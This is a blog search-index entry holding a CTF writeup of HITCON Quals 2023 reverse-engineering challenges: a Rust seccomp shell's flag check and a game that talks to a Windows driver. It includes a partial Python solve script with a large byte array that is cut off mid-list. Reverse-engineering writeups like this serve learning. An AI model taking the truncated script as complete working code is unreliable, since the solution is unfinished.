<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>hitcon-quals-2023</title>
      <link href="/2023/09/14/hitcon-quals-2023/"/>
      <url>/2023/09/14/hitcon-quals-2023/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>First time to compete at such a high level. I’ve learned a lot from this game and other players from <code>Maltese Prison Escapees</code>. But sadly, though i can solve some challenges, other players are so quick that i got zero pts in this game. Guess i need to try harder next time. Here’re writeups for those challenges i solved (or almost solved) in this game.</p><span id="more"></span><h2 id="blade-blade"><a href="#blade-blade" class="headerlink" title="blade_blade"></a><strong>blade_blade</strong></h2><p>It is a seccomp shell implemented using rust lang where we can execute several commands. After some checks, i found that there is a flag command that calls <code>seccomp_shell::shell::verify</code> function.</p><p>In this function, there is a huge loop  to shuffle and encode the input flag. </p><p>First, there are few code blocks below to do flag shuffles.</p><p><img src="/2023/09/14/hitcon-quals-2023/Untitled.png" alt="Untitled"></p><p>The last part of the loop do something different.</p><p><img src="/2023/09/14/hitcon-quals-2023/Untitled1.png" alt="Untitled"></p><p>This loop do a byte to byte encode, so there is a smart way to map all printable chars with encoded bytes.</p><p>The it transfer some shellcode for client to execute several times, every time the server embed the (shuffled) input and the final result into the shellcode. As shown in the picture, the input is put at <code>!RA\x11</code> and the result is put at <code>DEADBEEF</code> .</p><p><img src="/2023/09/14/hitcon-quals-2023/Untitled2.png" alt="Untitled"></p><h2 id="CrazyArcade"><a href="#CrazyArcade" class="headerlink" title="CrazyArcade"></a>CrazyArcade</h2><p>A game but with a driver to communicate with. All communitions use <code>DeviceIoControl</code>. It first get 0x584 bytes from the driver, and store it into <code>qword_7FF76B286248</code>.</p><p><img src="/2023/09/14/hitcon-quals-2023/Untitled3.png" alt="Untitled"></p><p>Then it send 37 bytes to the driver, that’s the initial value of our flag.</p><p><img src="/2023/09/14/hitcon-quals-2023/Untitled4.png" alt="Untitled"></p><p>In xrefs to <code>DeviceIoControl</code> we can find another position where the program communicate with the driver.</p><p><img src="/2023/09/14/hitcon-quals-2023/Untitled5.png" alt="Untitled"></p><p>The function here hit when we kill a bot in the game. Every time it get a byte from the driver and do some calculations and send it back. The limit here is 0x1337. So we get our solution.</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">res = <span class="hljs-string">b'\xb7\x8a\x19\x7fT-\x81\xf0\xb8\xdd\xca\xc9\xd3\xc3#2\xbaA\x81\xab\x02S\xc9.\xd6~ \xad\xab\xed\x95\xd2\xb6\xe7*\x92&gt;'</span></span><br><span class="line">data=[<span class="hljs-number">0x48</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x08</span>, <span 